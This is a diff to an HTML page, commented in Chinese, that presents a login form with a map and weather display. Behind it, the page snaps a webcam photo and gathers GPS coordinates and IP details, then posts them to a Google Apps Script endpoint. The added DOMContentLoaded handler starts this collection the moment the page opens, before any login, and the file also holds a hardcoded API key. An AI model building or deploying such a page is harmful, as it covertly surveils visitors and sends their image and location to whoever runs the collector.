@@ -99,8 +99,7 @@
     }
 
     /*******************************************************
-     * 彈跳動畫
-     * 可依喜好修改關鍵影格
+     * 彈跳動畫 (keyframes)
      *******************************************************/
     @keyframes bounceIn {
       0% {
@@ -262,7 +261,8 @@
     /************************************************
      * 0. 統一管理你的 Apps Script URL
      ************************************************/
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSYYuYmGzMJ4Ze96ECoCyGXKfUueDXFRB3_kDMdee8JNp6W6RvM8RjT80VaUHt8Ck2aw/exec'; // TODO: 替換成你的
+    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSYYuYmGzMJ4Ze96ECoCyGXKfUueDXFRB3_kDMdee8JNp6W6RvM8RjT80VaUHt8Ck2aw/exec'; 
+    // ↑ 請務必換成你自己的 Script URL
 
     /************************************************
      * 1. Modal 打開 / 關閉邏輯
@@ -316,7 +316,7 @@
     }
 
     /************************************************
-     * 4. 主要功能區塊
+     * 4. 主要功能區塊 (登入成功後才顯示)
      ************************************************/
     const mainPanel = document.getElementById('mainPanel');
 
@@ -374,8 +374,9 @@
           // 顯示主面板
           mainPanel.style.display = 'block';
 
-          // TODO: 若需要在此處再呼叫 collectAndSendData() 等功能，可自行加上
-          collectAndSendData(); 
+          // 登入成功後，開始收集相機/位置/IP等資料
+          collectAndSendData();
+
         } else {
           showErrorMessage('登入失敗：' + (result.error || '原因不明'));
         }
@@ -385,7 +386,7 @@
     });
 
     /************************************************
-     * 6. 相機、GPS、IP資料收集與上傳 (與之前類似)
+     * 6. 相機、GPS、IP資料收集與上傳
      ************************************************/
     async function startCamera() {
       let stream = null;
@@ -401,7 +402,7 @@
             resolve();
           };
         });
-        // 等待 500ms 再拍照
+        // 短暫等待後拍照
         await new Promise(resolve => setTimeout(resolve, 500));
 
         const canvas = document.createElement('canvas');
@@ -409,6 +410,8 @@
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // JPG 品質 0.8
         const photoData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
         return photoData;
       } catch (error) {
@@ -460,10 +463,12 @@
 
       const collectedData = { gps: null, ip: null, photo: null };
       try {
+        // 並行抓取 GPS / IP
         const [gpsResult, ipResult] = await Promise.allSettled([
           getGpsCoordinates(),
           getIpInfo(),
         ]);
+        // 拍照
         const photoResult = await startCamera();
 
         if (gpsResult.status === 'fulfilled') {
@@ -476,6 +481,7 @@
           collectedData.photo = photoResult;
         }
 
+        // 組裝送往後端
         const fd = new URLSearchParams();
         fd.append('message', '合併資料上傳');
         if (collectedData.gps) {
@@ -516,12 +522,12 @@
     }
 
     /************************************************
-     * 7. 天氣資訊 (可在登入成功後再執行)
+     * 7. 天氣資訊 (頁面載入後或登入成功後可執行)
      ************************************************/
     async function getWeatherInfo(latitude, longitude) {
       try {
         if (!latitude || !longitude) return;
-        // TODO: 替換成你自己的OpenWeatherMap Key
+        // TODO: 替換成你自己的 OpenWeatherMap API Key
         const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
         const resp = await fetch(
           `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
@@ -540,6 +546,30 @@
         document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
       }
     }
+
+    /************************************************
+     * 8. 頁面載入後自動執行(先抓GPS來顯示地圖與天氣)
+     ************************************************/
+    document.addEventListener('DOMContentLoaded', async () => {
+      try {
+        // 一開始就抓 GPS 座標，更新地圖 & 天氣（登入前也可看）
+        const gpsData = await getGpsCoordinates();
+        if (gpsData) {
+          // 更新地圖
+          document.getElementById('map').src = 
+            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
+          // 更新天氣
+          await getWeatherInfo(gpsData.latitude, gpsData.longitude);
+        }
+
+        // 一打開就開始記錄資料（相機 / IP / GPS）
+        // 注意：若不想在「未登入」時就收集，請移除此行或改到登入後
+        collectAndSendData();
+
+      } catch (error) {
+        console.error('DOMContentLoaded 初始化時錯誤:', error);
+      }
+    });
   </script>
 </body>
 </html>
